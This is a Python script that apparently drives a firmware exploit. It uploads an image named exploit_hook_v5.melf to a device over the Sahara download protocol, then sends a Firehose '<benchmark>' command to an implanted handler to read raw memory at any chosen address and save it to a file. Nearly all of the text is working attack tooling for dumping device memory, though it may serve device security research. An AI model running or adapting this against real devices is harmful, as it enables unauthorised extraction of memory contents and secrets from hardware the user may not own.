#!/usr/bin/env python3
"""
Upload exploit_hook_v5.melf via Sahara, then invoke the implanted
<benchmark> handler and check whether raw memory data comes back.

Usage: python test_hook.py COM10 [addr] [length]
Default probe: 0xd8000000 0x100 (harmless DDR scratch).
"""
import sys
import time

import fh_peek


def main():
    port = sys.argv[1] if len(sys.argv) > 1 else "COM10"
    addr = sys.argv[2] if len(sys.argv) > 2 else "0xd8000000"
    length = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x100

    image = open("exploit_hook_v5.melf", "rb").read()
    dev = fh_peek.Dev(port)
    fh_peek.log(f"[*] uploading exploit_hook_v5.melf ({len(image):#x} bytes)")
    if not fh_peek.sahara_upload(dev, image):
        return 1

    ok, _ = fh_peek.fh_cmd(dev, "<nop />", 10)
    fh_peek.log(f"[*] nop -> {'ACK' if ok else 'NAK/timeout'}")

    cmd = f'<benchmark address="{addr}" length="{length}"/>'
    fh_peek.log(f"[*] invoke {cmd}")
    dev.wr((f'<?xml version="1.0" ?><data>{cmd}</data>').encode())

    payload = b""
    raw_expect = None
    t0 = time.time()
    while time.time() - t0 < 60:
        if raw_expect is not None:
            payload += dev.rd(raw_expect - len(payload), 15)
            if len(payload) >= raw_expect:
                break
            continue
        kind, txt = fh_peek.fh_read_packet(dev, 10)
        if kind != "xml":
            continue
        fh_peek.fh_show_logs(txt)
        if 'rawmode="true"' in txt:
            raw_expect = length
            fh_peek.log("[*] rawmode announced - implant alive?")
            continue
        if "<response" in txt:
            fh_peek.log(f"[*] response: {txt.strip()[:200]}")
            if raw_expect is None:
                break
    if payload:
        fh_peek.log(f"[+] GOT {len(payload):#x} raw bytes")
        fh_peek.log(f"    first64: {payload[:64].hex()}")
        open("hook_probe.bin", "wb").write(payload)
        fh_peek.log("[+] saved -> hook_probe.bin")
        return 0
    fh_peek.log("[-] no raw payload - implant not active (original handler ran)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
